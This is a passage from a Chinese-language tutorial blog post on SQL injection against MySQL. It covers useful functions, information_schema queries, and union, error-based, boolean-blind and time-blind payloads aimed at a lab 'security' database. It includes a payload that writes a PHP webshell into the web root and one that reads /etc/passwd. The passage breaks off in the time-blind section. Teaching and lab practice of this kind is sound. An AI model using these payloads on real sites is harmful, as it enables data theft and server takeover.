<tr>
<td>00111110</td>
<td>62</td>
<td>3E</td>
<td>&gt;</td>
<td></td>
</tr>
<tr>
<td>00111111</td>
<td>63</td>
<td>3F</td>
<td>?</td>
<td></td>
</tr>
<tr>
<td>01000000</td>
<td>64</td>
<td>40</td>
<td>@</td>
<td></td>
</tr>
<tr>
<td>01000001</td>
<td>65</td>
<td>41</td>
<td>A</td>
<td></td>
</tr>
<tr>
<td>01000010</td>
<td>66</td>
<td>42</td>
<td>B</td>
<td></td>
</tr>
<tr>
<td>01000011</td>
<td>67</td>
<td>43</td>
<td>C</td>
<td></td>
</tr>
<tr>
<td>01000100</td>
<td>68</td>
<td>44</td>
<td>D</td>
<td></td>
</tr>
<tr>
<td>01000101</td>
<td>69</td>
<td>45</td>
<td>E</td>
<td></td>
</tr>
<tr>
<td>01000110</td>
<td>70</td>
<td>46</td>
<td>F</td>
<td></td>
</tr>
<tr>
<td>01000111</td>
<td>71</td>
<td>47</td>
<td>G</td>
<td></td>
</tr>
<tr>
<td>01001000</td>
<td>72</td>
<td>48</td>
<td>H</td>
<td></td>
</tr>
<tr>
<td>01001001</td>
<td>73</td>
<td>49</td>
<td>I</td>
<td></td>
</tr>
<tr>
<td>01001010</td>
<td>74</td>
<td>4A</td>
<td>J</td>
<td></td>
</tr>
<tr>
<td>01001011</td>
<td>75</td>
<td>4B</td>
<td>K</td>
<td></td>
</tr>
<tr>
<td>01001100</td>
<td>76</td>
<td>4C</td>
<td>L</td>
<td></td>
</tr>
<tr>
<td>01001101</td>
<td>77</td>
<td>4D</td>
<td>M</td>
<td></td>
</tr>
<tr>
<td>01001110</td>
<td>78</td>
<td>4E</td>
<td>N</td>
<td></td>
</tr>
<tr>
<td>01001111</td>
<td>79</td>
<td>4F</td>
<td>O</td>
<td></td>
</tr>
<tr>
<td>01010000</td>
<td>80</td>
<td>50</td>
<td>P</td>
<td></td>
</tr>
<tr>
<td>01010001</td>
<td>81</td>
<td>51</td>
<td>Q</td>
<td></td>
</tr>
<tr>
<td>01010010</td>
<td>82</td>
<td>52</td>
<td>R</td>
<td></td>
</tr>
<tr>
<td>01010011</td>
<td>83</td>
<td>53</td>
<td>S</td>
<td></td>
</tr>
<tr>
<td>01010100</td>
<td>84</td>
<td>54</td>
<td>T</td>
<td></td>
</tr>
<tr>
<td>01010101</td>
<td>85</td>
<td>55</td>
<td>U</td>
<td></td>
</tr>
<tr>
<td>01010110</td>
<td>86</td>
<td>56</td>
<td>V</td>
<td></td>
</tr>
<tr>
<td>01010111</td>
<td>87</td>
<td>57</td>
<td>W</td>
<td></td>
</tr>
<tr>
<td>01011000</td>
<td>88</td>
<td>58</td>
<td>X</td>
<td></td>
</tr>
<tr>
<td>01011001</td>
<td>89</td>
<td>59</td>
<td>Y</td>
<td></td>
</tr>
<tr>
<td>01011010</td>
<td>90</td>
<td>5A</td>
<td>Z</td>
<td></td>
</tr>
<tr>
<td>01011011</td>
<td>91</td>
<td>5B</td>
<td>[</td>
<td></td>
</tr>
<tr>
<td>01011100</td>
<td>92</td>
<td>5C</td>
<td>\</td>
<td></td>
</tr>
<tr>
<td>01011101</td>
<td>93</td>
<td>5D</td>
<td>]</td>
<td></td>
</tr>
<tr>
<td>01011110</td>
<td>94</td>
<td>5E</td>
<td>^</td>
<td></td>
</tr>
<tr>
<td>01011111</td>
<td>95</td>
<td>5F</td>
<td>_</td>
<td></td>
</tr>
<tr>
<td>01100000</td>
<td>96</td>
<td>60</td>
<td>&#96;</td>
<td></td>
</tr>
<tr>
<td>01100001</td>
<td>97</td>
<td>61</td>
<td>a</td>
<td></td>
</tr>
<tr>
<td>01100010</td>
<td>98</td>
<td>62</td>
<td>b</td>
<td></td>
</tr>
<tr>
<td>01100011</td>
<td>99</td>
<td>63</td>
<td>c</td>
<td></td>
</tr>
<tr>
<td>01100100</td>
<td>100</td>
<td>64</td>
<td>d</td>
<td></td>
</tr>
<tr>
<td>01100101</td>
<td>101</td>
<td>65</td>
<td>e</td>
<td></td>
</tr>
<tr>
<td>01100110</td>
<td>102</td>
<td>66</td>
<td>f</td>
<td></td>
</tr>
<tr>
<td>01100111</td>
<td>103</td>
<td>67</td>
<td>g</td>
<td></td>
</tr>
<tr>
<td>01101000</td>
<td>104</td>
<td>68</td>
<td>h</td>
<td></td>
</tr>
<tr>
<td>01101001</td>
<td>105</td>
<td>69</td>
<td>i</td>
<td></td>
</tr>
<tr>
<td>01101010</td>
<td>106</td>
<td>6A</td>
<td>j</td>
<td></td>
</tr>
<tr>
<td>01101011</td>
<td>107</td>
<td>6B</td>
<td>k</td>
<td></td>
</tr>
<tr>
<td>01101100</td>
<td>108</td>
<td>6C</td>
<td>l</td>
<td></td>
</tr>
<tr>
<td>01101101</td>
<td>109</td>
<td>6D</td>
<td>m</td>
<td></td>
</tr>
<tr>
<td>01101110</td>
<td>110</td>
<td>6E</td>
<td>n</td>
<td></td>
</tr>
<tr>
<td>01101111</td>
<td>111</td>
<td>6F</td>
<td>o</td>
<td></td>
</tr>
<tr>
<td>01110000</td>
<td>112</td>
<td>70</td>
<td>p</td>
<td></td>
</tr>
<tr>
<td>01110001</td>
<td>113</td>
<td>71</td>
<td>q</td>
<td></td>
</tr>
<tr>
<td>01110010</td>
<td>114</td>
<td>72</td>
<td>r</td>
<td></td>
</tr>
<tr>
<td>01110011</td>
<td>115</td>
<td>73</td>
<td>s</td>
<td></td>
</tr>
<tr>
<td>01110100</td>
<td>116</td>
<td>74</td>
<td>t</td>
<td></td>
</tr>
<tr>
<td>01110101</td>
<td>117</td>
<td>75</td>
<td>u</td>
<td></td>
</tr>
<tr>
<td>01110110</td>
<td>118</td>
<td>76</td>
<td>v</td>
<td></td>
</tr>
<tr>
<td>01110111</td>
<td>119</td>
<td>77</td>
<td>w</td>
<td></td>
</tr>
<tr>
<td>01111000</td>
<td>120</td>
<td>78</td>
<td>x</td>
<td></td>
</tr>
<tr>
<td>01111001</td>
<td>121</td>
<td>79</td>
<td>y</td>
<td></td>
</tr>
<tr>
<td>01111010</td>
<td>122</td>
<td>7A</td>
<td>z</td>
<td></td>
</tr>
<tr>
<td>01111011</td>
<td>123</td>
<td>7B</td>
<td>{</td>
<td></td>
</tr>
<tr>
<td>01111100</td>
<td>124</td>
<td>7C</td>
<td>|</td>
<td></td>
</tr>
<tr>
<td>01111101</td>
<td>125</td>
<td>7D</td>
<td>}</td>
<td></td>
</tr>
<tr>
<td>01111110</td>
<td>126</td>
<td>7E</td>
<td>~</td>
<td></td>
</tr>
<tr>
<td>01111111</td>
<td>127</td>
<td>7F</td>
<td>DEL (Delete)</td>
<td>删除</td>
</tr>
</tbody></table>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><ul>
<li><p><strong>查看数据</strong></p>
<p><code>version()</code>:查看MySQL版本</p>
<p><code>user()</code>:数据库用户名</p>
<p><code>current_user()</code>:当前用户名</p>
<p><code>database()</code>:数据库名</p>
<p><code>@@datadir</code>:数据库路径</p>
<p><code>system_ user()</code>:系统用户名</p>
<p><code>@@version_compile_os</code>:操作系统版本</p>
</li>
<li><p><strong>字符串拼接函数</strong></p>
<p><code>concat(str1,str2,...)</code>:没有分隔符的连接字符</p>
<p><code>concat_ws(separator,str1,str2)</code>:含有分隔符的连接字符串</p>
<p><code>group_concat(str1,str2,...)</code>:连接一个组的所有字符串，并以逗号分割每一条数据</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=‘security’ --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>会返回security库中的所有表并以逗号分隔开</p>
</blockquote>
</li>
<li><p><strong>延时函数</strong></p>
<p><code>sleep( )</code>:睡眠时间为指定的秒数</p>
</li>
<li><p><strong>字符串截取函数</strong></p>
<p><code>length()</code>:返回字符串的长度</p>
<blockquote>
<p>如length(database())会返回数据库名的长度</p>
</blockquote>
<p><code>left(str,num)</code>:对字符串str从左开始数起，返回num个字符</p>
<blockquote>
<p>如rleft(database(),2)&#x3D;se</p>
</blockquote>
<p><code>right(str,num)</code>:对字符串str从右开始数起，返回num个字符（与left相反）</p>
<p><code>substr(str,num1,num2)</code>:截取字符串，从起始位置num1开始，截取长度为num2</p>
<blockquote>
<p>**substr(database(),1,3)**从数据库第一位开始截取，截取三个字符</p>
</blockquote>
<p><code>substring( )</code>:与<code>substr()</code>一样</p>
<p><code>mid(str,sum1,sum2)</code>:与<code>substr()</code>一样</p>
</li>
<li><p><strong>编码函数</strong></p>
<p><code>ord()</code>:返回字符串第一个字符的ASCII值</p>
<blockquote>
<p>如<code>ord(&#39;a&#39;)</code>会返回97</p>
</blockquote>
<p><code>ascii()</code>:返回字符串第一个字符的ASCII值,与<code>ord()</code>一样</p>
<p><code>hex()</code>:将字符串转换为十六进制</p>
<p><code>unhex()</code>:hex的反向操作</p>
<p><code>md5()</code>:返回MD5值</p>
</li>
<li><p><strong>转义函数及配置</strong></p>
<p><code>addslashes()</code>:返回在预定义字符之前添加反斜杠的字符串。</p>
<blockquote>
<p>预定义字符：单引号<code>&#39;</code>,双引号<code>&quot;</code>,反斜杠<code>\</code>,NULL</p>
</blockquote>
<p><code>magic_quotes_gpc</code>:解析用户提交的数据，如有：post、get、cookie过来的数据增加转义符“\” 以确保这些数据不会引起程序错误,可用于防护SQL</p>
<blockquote>
<p><strong>PHP 5.4.0 版本之后被废弃，并在 PHP 7.0.0 中彻底移除。</strong></p>
</blockquote>
<p><code>mysql_real_escape_string():</code>用于在 MySQL 查询中转义特殊字符,返回转义后的字符串</p>
</li>
<li><p><strong>读写文件函数</strong></p>
<p><code>load_file()</code>:用于读取文件，返回文件内容作为字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#读取文件/etc/passwd （还可以查看其他文件，需要相应的权限）</span><br><span class="line">#路径可以为这两种格式&quot;\\&quot;与&quot;/&quot;，</span><br><span class="line">union select 1,2,load_file(&#x27;/etc/passwd&#x27;)</span><br></pre></td></tr></table></figure>

<p><code>into dumpfile</code>:用于写文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#在/var/www/html新建文件a.php，在将一句话木马写入</span><br><span class="line">union select 1,2,&quot;&lt;?php @eval($_POST[cmd]);?&gt;&quot; into dumpfile &#x27;/var/www/html/a.php&#x27; </span><br></pre></td></tr></table></figure>

<p><code>into outfile</code>:与<code>into dumpfile</code>用法一样</p>
</li>
<li><p><strong>其他函数</strong></p>
<p><code>if(true,t,f)</code>:用于判断</p>
<p><code>floor()</code>:向下取整</p>
<blockquote>
<p>floor(3.8)&#x3D;3</p>
</blockquote>
<p><code>count()</code>：返回当前列的数量</p>
<p><code>rand()</code>:取随机数0~1，若有参数x，则每个x对应一个固定的值</p>
<p><code>exp()</code>:以e为底的指数函数</p>
<blockquote>
<p>~0表示对0进行按位取反</p>
</blockquote>
<p><code>updatexml(XML_document, XPath_string, new_value)</code>:</p>
<ul>
<li>XML_document是String格式，为XML文档对象的名称，文中为Doc</li>
<li>XPath_string (Xpath格式的字符串)</li>
<li>new_value，String格式，替换查找到的符合条件的数据</li>
</ul>
<p><code>extractvalue(XML_document, XPath_string)</code>:与<code>updatexml()</code>类似，只是变成了两个参数</p>
</li>
</ul>
<h3 id="常用库表"><a href="#常用库表" class="headerlink" title="常用库表"></a>常用库表</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/2025/04/24/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93-%E8%B6%85%E8%AF%A6%E7%BB%86/QQ%E6%88%AA%E5%9B%BE20231220193939.png" alt="img"></p>
<ul>
<li><strong>information_schema.schemata：记录数据库信息的表</strong> </li>
<li><strong>information_schema.tables：记录表名信息的表</strong> </li>
<li><strong>information_schema.columns：记录列名信息的表</strong> </li>
<li><strong>schema_name 数据库名</strong> </li>
<li><strong>table_name 表名</strong> </li>
<li><strong>column_name 列名</strong> </li>
<li><strong>table_schema 数据库名</strong></li>
</ul>
<p>例：</p>
<blockquote>
<p>查数据库名：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select schema_name from information_schema.schemata;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查表名：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查数据：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from security.users;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查列名：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name= &#x27;users&#x27; and table_schema=&#x27;security&#x27;;</span><br></pre></td></tr></table></figure>

<h2 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h2><h3 id="union联合注入"><a href="#union联合注入" class="headerlink" title="union联合注入"></a>union联合注入</h3><p>原理：通过使用union关键字，对两个select语句进行联合查询；使用前提是<strong>前后查询的语句必须拥有相同数量的列</strong>（字段），列也必需拥有相同的数据类型。</p>
<p>适用情况：<strong>页面存在回显</strong>。</p>
<p>注入流程：</p>
<ul>
<li><p><strong>判断注入点</strong></p>
</li>
<li><p><strong>判断字段数</strong></p>
<p>因为union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样。所以要通过order by判断字段数。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断回显点</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>将id值改为111是为了让前面查询的语句为空，无显示，然后后面查询语句查询的元素显示出来。</p>
</blockquote>
</li>
<li><p><strong>查找库名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查找表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>group_concat()函数将所有查询的表名连在一起成为一条数据。</p>
</blockquote>
</li>
<li><p><strong>查找列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id= 111&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema = &#x27;security&#x27; and table_name = &#x27;users&#x27;  --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>查找字段</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=111’ union select 1,group_concat(username),group_concat(password) from security.users --+</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>页面没有内容回显，那么我们可以通过构造特定的SQL 语句使得数据库软件执行错误，随后服务端将错误反馈到用户端以暴露出<strong>特定信息</strong>的攻击方式。</p>
<p>一种情况是通过构造错误的参数，使得一些 SQL 语句的错误直接回显在页面上，暴露一些 SQL 语句信息便于使用特定的攻击手段；</p>
<p>另一种情况是后台没有对一些具有报错功能的函数进行过滤，使得一些关键信息被直接被以报错的形式携带到页面上。</p>
<p>二者的前提都<strong>基于 WEB 应用程序未关闭数据库的报错函数</strong>。</p>
<h4 id="updatexml-extractvalue"><a href="#updatexml-extractvalue" class="headerlink" title="updatexml()&#x2F;extractvalue()"></a>updatexml()&#x2F;extractvalue()</h4><p><code>updatexml(XML_document, XPath_string, new_value)</code>:</p>
<ul>
<li>XML_document是String格式，为XML文档对象的名称，文中为Doc</li>
<li>XPath_string (Xpath格式的字符串)</li>
<li>new_value，String格式，替换查找到的符合条件的数据</li>
</ul>
<p><code>extractvalue(XML_document, XPath_string)</code>:与<code>updatexml()</code>类似，只是变成了两个参数</p>
<p>原理就是<strong>利用XML解析错误，通过构造错误的XPath表达式来触发报错。Xpath语法不允许存在特殊字符串，而我们可以构造0x7e(~)特殊字符来报错</strong></p>
<p><strong>查库名</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,database(),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,database(),0x7E));</span><br></pre></td></tr></table></figure>

<p><strong>查表名</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),0x7E));</span><br></pre></td></tr></table></figure>

<p><strong>查列名</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),0x7E));</span><br></pre></td></tr></table></figure>

<p><strong>查字段</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and updatexml(1,concat(0x7E,(select user from security.users),0x7E),1);</span><br><span class="line"></span><br><span class="line">1&#x27; and extractvalue(1,concat(0x7E,(select user from security.users),0x7E));</span><br></pre></td></tr></table></figure>

<p>注意由于updatexml() 函数的报错内容长度不能超过32个字符，所以常常配合limit分页获取所有字符。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 偏移量, 每页记录数;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,(select user from mysql.user limit 1,2)),3)</span><br><span class="line">//第一个参数表示跳过一条记录，第二个参数表示返回两条记录，即从第二条开始返回两条记录</span><br></pre></td></tr></table></figure>

<p>或者利用substr()截取字符串：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; and updatexml(1,concat(0x7e,substr((select group_concat(user) from mysql.user),1,31)),3)</span><br></pre></td></tr></table></figure>

<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p><code>exp()</code>:以e为底的指数函数</p>
<p>在mysql&gt;5.5.53时，则不能返回查询结果</p>
<p>其中~0表示对0进行按位取反，原理就是<strong>对0取反后会得到最大的BIGINT值，利用他进行报错</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; union select 1,2,exp(~(select * from (select database())a))--+</span><br></pre></td></tr></table></figure>

<blockquote>
<p>由于将0按位取反就会返回“18446744073709551615”，再加上函数成功执行后返回0的缘故，我们将成功执行的函数取反就会得到最大的<strong>无符号BIGINT值</strong>。<br>通过子查询与按位取反，造成一个<strong>DOUBLE overflow error</strong>，并借由此注出数据。</p>
</blockquote>
<h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p><code>floor()</code>:向下取整</p>
<p><code>count()</code>：返回当前列的数量</p>
<p><code>rand()</code>:取随机数0~1，若有参数x，则每个x对应一个固定的值</p>
<p>原理就是利用MySQL的<code>GROUP BY</code>与<code>rand()</code>函数的主键冲突特性，通过故意构造重复的临时表键值，触发报错并泄露敏感信息。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot; and (select 1 from (select count(*),concat(0x23,(database()),0x23,floor(rand(0)*2)) as x from information_schema.columns group by x) as y)--+</span><br></pre></td></tr></table></figure>

<p>在上面的payload中，<code>select concat(0x23,(database()),0x23,floor(rand(0)*2))</code>拼接当前数据库名和随机数:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#testdb#1</span><br></pre></td></tr></table></figure>

<p>简化下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*), x from information_schema.columns group by x</span><br></pre></td></tr></table></figure>

<p><code>group by x</code>会按字段<code>x</code>分组统计，MySQL会为每个唯一<code>x</code>创建临时表，而我们插入临时表时，x的值被计算了<strong>两次</strong>（<strong>一次用于分组，一次用于插入</strong>），但由于<code>floor(rand(0)*2)</code>的不确定性：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT floor(rand(0)*2) FROM ...; </span><br><span class="line">-- 序列：0,1,1,0,1,1,1,...</span><br></pre></td></tr></table></figure>

<p>此时会导致两次计算结果可能不同，而当插入的值与已有主键冲突时，<strong>MySQL抛出错误并泄露当前计算值</strong>。</p>
<h4 id="geometrycollection"><a href="#geometrycollection" class="headerlink" title="geometrycollection()"></a>geometrycollection()</h4><p><code>geometrycollection()</code>：用于创建一个几何集合对象，包含多个几何类型的元素。如果传入的参数不符合几何类型的规范，MySQL会抛出错误。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select geometrycollection((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select geometrycollection((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure>

<h4 id="multipoint"><a href="#multipoint" class="headerlink" title="multipoint()"></a>multipoint()</h4><p>原理：参数不符合多点几何格式（如字符串代替坐标）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select multipoint((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select multipoint((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure>

<h4 id="polygon"><a href="#polygon" class="headerlink" title="polygon()"></a>polygon()</h4><p>原理：参数非闭合多边形坐标格式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select polygon((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select polygon((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure>

<h4 id="multilinestring"><a href="#multilinestring" class="headerlink" title="multilinestring()"></a>multilinestring()</h4><p>原理：参数不符合多线几何格式。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select multilinestring((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select multilinestring((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure>

<h4 id="linestring"><a href="#linestring" class="headerlink" title="linestring()"></a>linestring()</h4><p>原理类似于前面的多边形函数，<code>linestring()</code> 是 MySQL 中用于处理 <strong>线几何对象（LineString）</strong> 的空间函数，要求参数必须为有效的点坐标序列（如 <code>POINT(x,y)</code>）。当传入非法参数（如字符串、子查询结果等）时，MySQL 会抛出错误。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select linestring((select database())));</span><br><span class="line"></span><br><span class="line">1&#x27; and (select linestring((select table_name FROM information_schema.tables WHERE table_schema=database())));</span><br></pre></td></tr></table></figure>

<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>盲注：当存在SQL注入时，攻击者无法通过页面或请求的返回信息，回显或获取到SQL注入语句的执行结果的情况。</p>
<p>原理：通过SQL注入，利用返回的True或False来判断注入语句是否执行成功。</p>
<p>适用情况：</p>
<ul>
<li><p><strong>该输入框存在注入点</strong>。 </p>
</li>
<li><p><strong>该页面或请求不会回显注入语句执行结果，故无法使用union注入</strong>。 </p>
</li>
<li><p><strong>对数据库报错进行了处理，无论用户怎么输入都不会显示报错信息，故无法使用报错注入</strong></p>
</li>
</ul>
<p>常用函数：</p>
<ul>
<li>length() 返回字符串的长度，例如可以返回数据库名字的长度 。 </li>
<li>substr() ⽤来截取字符串  。</li>
<li>ascii() 返回字符的ascii码 。</li>
<li>sleep(n) 将程序挂起⼀段时间，n为n秒。 </li>
<li>if(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句。</li>
<li>count()：返回当前列的数量</li>
</ul>
<p>一般流程：</p>
<ul>
<li><p><strong>判断数据库个数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.schemata)&gt;6</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断数据库名的长度</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and length(database())&gt;11  #回显正常</span><br><span class="line">and length(database())&gt;12  #回显错误</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜测数据库名（使用ascii码来依次判断）</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),1,1)))&gt;100 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断指定数据库中有多少个表</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.tables where table_schema=&#x27;demo&#x27;)&gt;4</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜测表名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select table_name from information_schema.tables where table.schema=database() limit 1,1)1,1)&gt;144 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断列个数</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select count(*) from information_schema.columns where table_name=&#x27;user&#x27; and table_schema=&#x27;demo&#x27;)</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>判断列名</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select column_name from information_schema.columns where table.schema=database() and table_name=&#x27;user&#x27; limit 0,1)1,1)&gt;105 --+</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>猜测字段内容</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(( select password from demo.user limit 0,1),1,1)))=68--+</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>适用情况：页面不会返回错误信息，只会回显一种界面。</p>
<p>原理：通过与if(expr1,expr2,expr3)语句结合使用，利用sleep函数，制造时间延迟，由回显时间来判断是否报错。</p>
<p>流程：</p>
<ul>
<li><p><strong>判断注入类型</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>获取数据库名</strong></p>
